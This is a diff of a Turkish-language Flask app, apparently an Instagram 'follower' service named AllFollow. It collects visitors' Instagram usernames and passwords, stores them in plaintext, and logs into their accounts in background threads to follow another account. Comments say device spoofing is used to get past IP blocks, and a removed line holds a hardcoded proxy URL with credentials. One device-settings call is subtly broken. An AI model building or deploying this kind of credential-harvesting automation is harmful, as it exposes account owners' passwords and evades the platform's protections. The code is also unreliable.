@@ -1,15 +1,14 @@
 import os
+import threading
 import time
 import random
-import logging
 from flask import Flask, request, jsonify, render_template_string
 from flask_sqlalchemy import SQLAlchemy
 from instagrapi import Client
-from instagrapi.exceptions import ChallengeRequired, BadPassword, LoginRequired, FeedbackRequired
+from instagrapi.exceptions import ChallengeRequired, BadPassword, LoginRequired
 from dotenv import load_dotenv
 
 load_dotenv()
-logging.basicConfig(level=logging.INFO)
 
 app = Flask(__name__)
 app.config['SQLALCHEMY_DATABASE_URI'] = os.getenv("DATABASE_URL")
@@ -17,114 +16,139 @@ app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
 
 db = SQLAlchemy(app)
 
-# Proxy varsa buraya yazabilirsin, yoksa None kalsın.
-PROXY_URL = "http://SDDLzRveLbkavJr:MPvdO65MOnMifL7@82.41.250.136:42158"
-
 class IGAccount(db.Model):
     id = db.Column(db.Integer, primary_key=True)
     username = db.Column(db.String(100), unique=True, nullable=False)
     password = db.Column(db.String(100), nullable=False)
-    status = db.Column(db.String(100), default="Bekliyor")
+    status = db.Column(db.String(100), default="Sıraya Alındı...")
+    last_error = db.Column(db.Text, nullable=True)
+
+# ASIL BOT MOTORU - ASENKRON ÇALIŞIR
+def start_insta_task(u, p):
+    with app.app_context():
+        cl = Client()
+        acc = IGAccount.query.filter_by(username=u).first()
+        try:
+            # Render IP'si engelliyse cihaz taklidi şart
+            cl.set_device_settings(cl.delay_range == [2, 4])
+            
+            # Instagram'a giriş denemesi (Burası 20-30 sn sürebilir)
+            if cl.login(u, p):
+                acc.status = "AKTİF ✅"
+                acc.last_error = None
+                db.session.commit()
+                # Örnek işlem: Kendi profilini takip et veya birini beğen
+                cl.user_follow(cl.user_id_from_username("instagram"))
+        except ChallengeRequired:
+            acc.status = "KOD GEREKLİ ⚠️"
+            db.session.commit()
+        except BadPassword:
+            acc.status = "ŞİFRE HATALI ❌"
+            db.session.commit()
+        except Exception as e:
+            acc.status = "BAĞLANTI ENGELİ 🚫"
+            acc.last_error = str(e)
+            db.session.commit()
 
 @app.route('/')
 def index():
     return render_template_string(HTML_TEMPLATE)
 
-@app.route('/api/login', methods=['POST'])
-def login_api():
+@app.route('/api/connect', methods=['POST'])
+def connect():
     data = request.json
     u, p = data.get('u'), data.get('p')
-    cl = Client()
+    if not u or not p: return jsonify(error="Eksik bilgi")
+
+    acc = IGAccount.query.filter_by(username=u).first()
+    if not acc:
+        acc = IGAccount(username=u, password=p)
+        db.session.add(acc)
+    else:
+        acc.password, acc.status = p, "Giriş Yapılıyor..."
+    db.session.commit()
     
-    # Cihaz simülasyonu
-    cl.set_device_settings({
-        "app_version": "269.0.0.18.75",
-        "android_version": 26,
-        "android_release": "8.0.0",
-        "dpi": "480dpi",
-        "resolution": "1080x1920",
-        "manufacturer": "Samsung",
-        "device": "SM-G973F",
-        "model": "beyond1",
-        "cpu": "exynos9820",
-        "version_code": "442431182"
-    })
+    # --- KRİTİK NOKTA ---
+    # Thread başlatıyoruz ve Flask HİÇ BEKLEMEDEN "ok" dönüyor.
+    # Bu sayede Render bağlantıyı koparamıyor.
+    threading.Thread(target=start_insta_task, args=(u, p)).start()
+    
+    return jsonify(status="started")
 
-    if PROXY_URL:
-        try:
-            cl.set_proxy(PROXY_URL)
-        except:
-            logging.error("Proxy ayarlanamadı.")
-
-    try:
-        logging.info(f"Giris deneniyor: {u}")
-        time.sleep(random.uniform(2, 4))
-        
-        if cl.login(u, p):
-            acc = IGAccount.query.filter_by(username=u).first()
-            if not acc:
-                acc = IGAccount(username=u, password=p, status="AKTIF")
-                db.session.add(acc)
-            else:
-                acc.status = "AKTIF"
-            db.session.commit()
-            return jsonify(status="success", next_step="dashboard")
-            
-    except BadPassword:
-        return jsonify(status="error", message="Sifre Yanlis!")
-    except ChallengeRequired:
-        return jsonify(status="challenge", next_step="verify")
-    except FeedbackRequired:
-        return jsonify(status="error", message="Instagram engeli: 15 dk bekleyin.")
-    except Exception as e:
-        err = str(e).lower()
-        logging.error(f"Hata: {err}")
-        if "checkpoint" in err:
-            return jsonify(status="challenge", next_step="verify")
-        return jsonify(status="error", message="Baglanti Hatasi (IP Bloklu olabilir)")
-
-@app.route('/api/verify', methods=['POST'])
-def verify_api():
-    return jsonify(status="success")
+@app.route('/api/check/<u>')
+def check_status(u):
+    acc = IGAccount.query.filter_by(username=u).first()
+    if acc:
+        return jsonify(status=acc.status, error=acc.last_error)
+    return jsonify(status="Hesap bulunamadı")
 
 HTML_TEMPLATE = """
 <!DOCTYPE html>
-<html>
+<html lang="tr">
 <head>
     <meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>AllFollow</title>
+    <title>AllFollow VIP</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <style>
-        body { background: #000; color: #fff; display: flex; align-items: center; justify-content: center; min-height: 100vh; font-family: sans-serif; }
-        .box { background: #111; border: 1px solid #333; padding: 2rem; border-radius: 1.5rem; width: 320px; text-align: center; }
-        input { width: 100%; background: #222; border: 1px solid #444; padding: 10px; border-radius: 8px; color: #fff; margin-bottom: 10px; outline: none; }
-        button { width: 100%; background: #a855f7; color: #fff; font-weight: bold; padding: 10px; border-radius: 8px; border: none; cursor: pointer; }
-        .loader { border: 2px solid #f3f3f3; border-top: 2px solid #a855f7; border-radius: 50%; width: 14px; height: 14px; animation: spin 1s linear infinite; display: inline-block; vertical-align: middle; }
+        body { background: #000; color: #eee; font-family: 'Inter', sans-serif; }
+        .glass { background: #111; border: 1px solid #333; border-radius: 20px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
+        .page { display: none; } .active { display: block; animation: fadeIn 0.4s ease; }
+        @keyframes fadeIn { from { opacity: 0; transform: scale(0.95); } to { opacity: 1; transform: scale(1); } }
+        .loader { border: 2px solid #333; border-top: 2px solid #a855f7; border-radius: 50%; width: 20px; height: 20px; animation: spin 1s linear infinite; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
     </style>
 </head>
-<body>
-    <div id="login-page" class="box">
-        <h1 class="text-2xl font-black text-purple-500 mb-6 italic">ALLFOLLOW</h1>
-        <input id="u" placeholder="Kullanıcı Adı">
-        <input id="p" type="password" placeholder="Şifre">
-        <button onclick="login()" id="btn">GİRİŞ YAP</button>
-        <p id="err" class="text-red-500 text-[10px] mt-3 font-bold"></p>
+<body class="flex items-center justify-center min-h-screen p-6">
+
+    <div id="login-page" class="page active glass p-8 w-full max-w-[340px] text-center">
+        <h1 class="text-3xl font-black italic text-purple-600 mb-8 tracking-tighter">ALLFOLLOW</h1>
+        <input id="u" placeholder="Kullanıcı Adı" class="w-full bg-zinc-900 border border-zinc-800 p-3 rounded-xl mb-3 outline-none focus:border-purple-500">
+        <input id="p" type="password" placeholder="Şifre" class="w-full bg-zinc-900 border border-zinc-800 p-3 rounded-xl mb-6 outline-none focus:border-purple-500">
+        <button onclick="login()" class="w-full bg-purple-600 font-bold py-3 rounded-xl hover:bg-purple-500 active:scale-95 transition">SİSTEME GİRİŞ</button>
     </div>
+
+    <div id="status-page" class="page glass p-8 w-full max-w-[340px] text-center">
+        <div class="flex justify-center mb-6"><div class="loader"></div></div>
+        <h2 class="text-sm font-bold text-zinc-500 uppercase tracking-widest mb-2">İşlem Durumu</h2>
+        <div id="status-text" class="text-xl font-black text-purple-400 italic mb-6 uppercase">BAĞLANILIYOR...</div>
+        <p id="user-display" class="text-xs text-zinc-600 font-mono"></p>
+        <div id="error-log" class="text-[10px] text-red-900 mt-4 break-words"></div>
+    </div>
+
     <script>
+        let targetUser = "";
         async function login() {
-            const btn = document.getElementById('btn'), err = document.getElementById('err');
-            btn.disabled = true; btn.innerHTML = '<div class="loader"></div> BEKLEYİN...';
-            try {
-                const r = await fetch('/api/login', {
-                    method: 'POST',
-                    headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({u: document.getElementById('u').value, p: document.getElementById('p').value})
-                });
+            targetUser = document.getElementById('u').value;
+            const p = document.getElementById('p').value;
+            if(!targetUser || !p) return;
+
+            // Hemen sayfa değiştir (Zaman aşımını önlemek için ilk adım)
+            document.getElementById('login-page').classList.remove('active');
+            document.getElementById('status-page').classList.add('active');
+            document.getElementById('user-display').innerText = "@" + targetUser;
+
+            // Sunucuya isteği fırlat (Cevap beklemeden devam eder)
+            fetch('/api/connect', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({u: targetUser, p: p})
+            });
+
+            // Her 3 saniyede bir veritabanından durumu kontrol et
+            const checker = setInterval(async () => {
+                const r = await fetch('/api/check/' + targetUser);
                 const d = await r.json();
-                if(d.status === "success") { alert("Giriş Başarılı!"); location.reload(); }
-                else { err.innerText = d.message; btn.disabled = false; btn.innerText = "GİRİŞ YAP"; }
-            } catch { err.innerText = "Bağlantı koptu!"; btn.disabled = false; btn.innerText = "GİRİŞ YAP"; }
+                const st = document.getElementById('status-text');
+                
+                st.innerText = d.status;
+                if(d.error) document.getElementById('error-log').innerText = d.error;
+
+                if(d.status.includes('✅') || d.status.includes('❌') || d.status.includes('🚫')) {
+                    // İşlem bittiğinde loader'ı durdurabiliriz
+                    document.querySelector('.loader').style.display = 'none';
+                    clearInterval(checker);
+                }
+            }, 3000);
         }
     </script>
 </body>
